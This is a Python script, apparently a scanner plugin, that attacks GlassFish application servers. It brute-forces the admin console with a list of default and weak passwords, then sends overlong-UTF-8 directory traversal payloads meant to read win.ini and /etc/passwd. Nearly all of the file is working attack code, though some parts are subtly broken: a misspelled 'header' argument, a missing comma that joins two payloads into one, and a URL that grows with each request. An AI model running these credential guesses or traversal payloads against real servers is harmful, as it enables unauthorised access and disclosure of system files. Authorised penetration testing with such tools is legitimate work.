#coding=utf-8
import requests
from user_agent import get_user_agent
def glassfish_weak1(host):
    try:
        url = "https://%s" % (host)
        headers = {'User-Agent': get_user_agent()}
        flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                     '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                     'src="/header.jsf"', '<title>Common Tasks</title>', 'title="Logout from GlassFish']
        user_list = ['admin']
        pass_list = ['admin', 'glassfish', 'password', '123456', '12345678', '123456789', 'admin123', 'admin888',
                     'admin1', 'administrator', '8888888', '123123', 'manager', 'root']
        for user in user_list:
            for password in pass_list:
                try:
                    PostStr = 'j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true' % (
                    user, password)
                    s = requests.post(url + '/common/j_security_check', data=PostStr, header=headers)
                    res_html = s.text
                except Exception:
                    return "/common/j_security_check no exist glassfish weak password"
                for flag in flag_list:
                    if flag in res_html:
                        info = '%s/common GlassFish Weak password %s:%s' % (url, user, password)
                        return 'YES|' + info
        return "/common/j_security_check no exist glassfish weak password"
    except Exception:
        return "/common/j_security_check no exist glassfish weak password"
def glassfish_weak2(host):
    try:
        url = "http://%s" % (host)
        headers = {'User-Agent': get_user_agent()}
        flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                     '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                     'src="/header.jsf"', 'src="/index.jsf"', '<title>Common Tasks</title>',
                     'title="Logout from GlassFish']
        user_list = ['admin']
        pass_list = ['admin', 'glassfish', 'password', 'adminadmin', '123456', '12345678', '123456789', 'admin123',
                     'admin888', 'admin1', 'administrator', '8888888', '123123', 'manager', 'root']
        for user in user_list:
            for password in pass_list:
                try:
                    PostStr = 'j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true' % (
                        user, password)
                    res = requests.post(url + '/j_security_check?loginButton=Login', data=PostStr, headers=headers)
                    res_html = res.text
                except Exception:
                    return "no exist index.jsf GlassFish Weak password"
                for flag in flag_list:
                    if flag in res_html:
                        info = '%s/index.jsf GlassFish Weak password %s:%s' % (url, user, password)
                        return 'YES|' + info
        return "no exist index.jsf GlassFish Weak password"
    except Exception:
        return "no exist index.jsf GlassFish Weak password"
def glassfish_Directory_traversal(url):
    #https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18822
    try:
        headers = {'User-Agent': get_user_agent()}
        poc = [
            "/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini",
            "/theme/META-INF/json%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini",
            "/theme/META-INF/dojo%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini",
            "/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini",
            "/theme/com/sun%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini",
            "/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini"
            "/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/etc/passwd"
            ]
        flag = ["[fonts]", "root"]
        for i in poc:
            url = url + i
            s = requests.get(url=url, headers=headers)
            for j in flag:
                if j in s.text:
                    return "exist Directory_traversal vuln"
        return "no exist Directory_traversal vuln"
    except Exception:
        return "no exist Directory_traversal vuln"
def glassfish(url):
    a=glassfish_weak1(url)
    print(a)
    b=glassfish_weak2(url)
    print(b)
    c=glassfish_Directory_traversal(url)
    print(c)



